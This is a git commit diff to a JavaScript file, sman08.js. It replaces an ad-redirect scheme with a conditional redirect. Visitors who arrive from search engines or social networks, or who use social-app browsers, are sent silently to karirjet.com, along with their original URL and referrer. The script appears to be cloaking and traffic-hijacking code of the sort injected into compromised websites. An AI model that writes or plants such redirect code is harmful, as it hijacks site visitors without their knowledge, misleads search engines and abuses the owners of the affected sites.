4384c84c4aa125855c7d9370a48dd3cfc3227cce
hamzah79 <hamzah.pujiningrat@gmail.com>
2021-10-05 15:49:54 +0700

    Update sman08.js

--- sman08.js
+++ sman08.js
@@ -1,43 +1,8 @@
-    var go_current     	= window.location.href;
-    var reff     	= document.referrer;
-    
-
-    function rChoice(arr) {
-	    return arr[Math.floor(arr.length * Math.random())];
-	}
-
-    var direct_link_ads = rChoice([
-                            "https://stunthedge.com/fz6cxwmi?key=5ee5e913b3e852805476f79565060a05",
-                            "https://stunthedge.com/fz6cxwmi?key=5ee5e913b3e852805476f79565060a05",
-                        ]);
-
-    var ars             = rChoice([
-                            "https://karirjet.com/",
-                            "https://karirjet.com/",
-                        ]);
-
-
-    var dir_type        = "refresh"; //refresh, domain, path, arsae
-
-
-    if(dir_type == 'arsae')
-    {
-        //REFRESH
-        console.log('refresh..');
-    }
-    else if(dir_type == 'domain')
-    {
-        //==> OTHER DOMAIN
-        go_current = ars;
-    }
-    else if(dir_type == 'path')
-    {
-        //==> PATH DIRECT
-        var pre_current   = ars + window.location.pathname;
-        go_current        = pre_current.includes("?")?pre_current+"&c=1":pre_current+"?c=1";
-    }
-    else if(dir_type == 'arsae')
-    {
-        //==> ARSAE DIRECT
-        go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
-    }
+var ars = rChoice([
+'https://karirjet.com/'
+]);
+function rChoice(arr) {
+return arr[Math.floor(arr.length * Math.random())];
+}
+//Code arsae client javascript
+if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
